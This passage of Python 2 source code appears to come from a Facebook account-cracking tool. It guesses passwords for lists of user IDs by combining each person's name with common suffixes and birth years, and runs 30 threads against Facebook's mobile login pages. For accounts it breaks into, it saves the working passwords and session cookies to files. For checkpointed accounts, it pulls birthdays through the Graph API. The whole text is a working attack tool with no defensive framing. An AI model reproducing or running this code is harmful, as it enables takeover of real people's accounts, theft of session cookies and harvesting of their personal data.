            ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _sultani, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://mbasic.facebook.com')
            b = ses.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[TIGER-OK] %s | %s | %s %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('/sdcard/saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[TIGER-CP] %s | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[TIGER-CP] %s | %s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global loop
        (
         sys.stdout.write('\r[%s\x1b[1;92mR\xe2\x99\xa1S%s] [crack] %s/%s -> \x1b[1;92mOK\x1b[1;97m-:\x1b[1;92m%s - \x1b[1;93mCP\x1b[1;97m-:\x1b[1;93m%s \x1b[1;97m' % (O, N, loop, len(self.id), len(ok), len(cp))),)
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
                os.mkdir('saved')
            except:
                pass

            try:
                _sultani = open('mking.txt', 'r').read()
            except (KeyError, IOError):
                _sultani = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

            ses = requests.Session()
            ses.headers.update({'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': _sultani, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
            p = ses.get('https://m.facebook.com')
            b = ses.post('https://m.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'})
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r%s[TIGER-OK] %s|%s|%s %s' % (H, user, pw, kuki, N)
                wrt = ' [\xe2\x9c\x93] %s|%s|%s' % (user, pw, kuki)
                ok.append(wrt)
                open('/sdcard/saved/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    sultani = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s' % (user, sultani)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r%s[TIGER-CP] %s | %s | %s %s %s %s' % (K, user, pw, day, month, year, N)
                    wrt = ' [\xc3\x97] %s|%s|%s %s %s' % (user, pw, day, month, year)
                    cp.append(wrt)
                    open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r%s[TIGER-CP] %s|%s %s' % (K, user, pw, N)
                wrt = ' [\xc3\x97] %s|%s' % (user, pw)
                cp.append(wrt)
                open('saved/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('HALBZHIRA [!] ')
        print '\x1b[1;97m-------------------------------------------------'
        if yan == '':
            print '%s[%s\x1b[1;91m\xc3\x97%s] dont be empty bro' % (N, M, N)
            self.__pler__()
        elif yan in ('1', '01'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                      
                    
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        __mking__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        elif yan in ('2', '02'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                      
                    
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        __mking__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        elif yan in ('3', '03'):
            with mking__pass(max_workers=30) as (__mking__):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                      
                    
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        else:
                            pwx = [name, xz[0] + '123', xz[0] + '12345', xz[0] + '1234', xz[0] + '2005', xz[0] + '1995' , xz[0] + '2004', xz[0] + '2002' , xz[0] + '2003',xz[0] + '2006',xz[0] + '321',xz[0] + '1122',xz[0] + '1999',xz[0] + '2000',xz[0] + '2008',xz[0] + '4321',xz[0] + '54321',xz[0] + '12',xz[0] + '1212',xz[0] + '112233', xz[0] + '1122']
                        __mking__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            seved_ok_cp(ok, cp)
        else:
            print '%s[%s\x1b[1;91m\xc3\x97%s] correct input' % (N, M, N)
            self.__pler__()


if __name__ == '__main__':
    os.system('git pull')
    menu()